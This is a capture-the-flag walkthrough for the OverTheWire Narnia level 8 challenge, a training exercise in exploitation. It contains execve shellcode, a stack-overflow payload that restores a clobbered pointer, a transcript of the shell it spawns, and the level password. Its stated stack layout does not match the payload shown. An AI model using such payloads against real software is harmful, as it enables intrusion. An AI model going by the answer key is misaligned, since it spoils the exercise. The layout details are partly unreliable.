# Narnia Level 8 → 9

## Goal

A 20-byte buffer, a `strcpy` that copies input into it, but the code also keeps around a **pointer to the start of the copy** that it uses after the overflow. If the overflow clobbers that pointer, the program will crash before returning. You need to overflow the buffer, clobber the return address, **and preserve the saved pointer** by writing back the correct value.

## Concepts you'll learn

- Dealing with "the overflow destroys a pointer I still need" — restore it as part of the payload
- Adjusting addresses in your payload as the payload grows (because the stack shifts with every added byte)
- Using a helper C program to find the address of a `SHELLCODE` env var at runtime

## Walkthrough

### 1. Read the source

(Abbreviated.)

```c
int main(int argc, char *argv[]){
    char buf[20];
    char *b  = buf;
    char *eb = buf;  // or argv[1] — level varies
    int  i;

    if(argc == 1) { ... }

    for(i = 0; i < strlen(argv[1]); i++) {
        /* copy one byte */
        b[i] = argv[1][i];
    }

    /* later uses b or eb here */
    ...
}
```

The key observation: between `buf` and the saved return address on the stack, there's a **pointer** (`b` or `eb`) that the code dereferences later. If you overwrite it with garbage, the program will crash before you get to return. You have to rewrite it with a sane value.

### 2. Put shellcode in an env var

```bash
$ export SHELLCODE=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*200 + b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80")')
```

Find its address with a helper:

```bash
$ cat > /tmp/getenv.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char **argv){
    printf("%s=%p\n", argv[1], getenv(argv[1]));
    return 0;
}
EOF
$ gcc /tmp/getenv.c -o /tmp/getenv
$ /tmp/getenv SHELLCODE
SHELLCODE=0xffffdea1
```

Aim ~100 bytes into the NOP sled for margin.

### 3. Build the payload

Layout for this level (approximate; verify in `gdb`):

```
[ 20 bytes buf ][ ptr to restore (4 bytes) ][ saved ret address (4 bytes) ]
```

Payload: `20*'A' + <ptr-to-restore> + <shellcode-address>`.

The pointer value that the program still needs after the copy is typically `&buf[0]` or `argv[1]`. Under `gdb`, break right after the copy and inspect what the code does with that pointer; the value to write back is whatever the post-loop code expects.

Axcheron landed on a payload shape like:

```
20*'A' + '\x5e\xd8\xff\xff' + 'AAAA' + '\xa1\xde\xff\xff'
```

The `\x5e\xd8\xff\xff` is the restored pointer; the `\xa1\xde\xff\xff` is the shellcode address.

### 4. Fire

```bash
$ /narnia/narnia8 $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\x5e\xd8\xff\xff" + b"AAAA" + b"\xa1\xde\xff\xff")')
$ whoami
narnia9
$ cat /etc/narnia_pass/narnia9
eiL5fealae
```

### 5. A warning about stack drift

Adding bytes to `argv[1]` pushes the stack down, which shifts the address of every stack variable — including `SHELLCODE`'s address. If you add one byte to your payload, every stack address you've pinned drifts by ~1 byte. The common workarounds:

- Keep payload length **constant** across attempts (pad with NOPs or filler instead of cutting bytes)
- Use a **big** NOP sled so small drifts don't miss the target
- Use `gdb`'s `set disable-randomization on` while you're finding the offset, then re-test outside `gdb`

### 6. Narnia 9 is the end

Narnia is a 10-level game (0–9). Logging in as `narnia9` reaches the final user; there's nothing further to exploit, just a congratulations. Natural next stops: [Behemoth](../behemoth/README.md) or [Utumno](../utumno/README.md).

## The answer

The password for `narnia9` is:

**`eiL5fealae`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/narnia/narnia8.html>
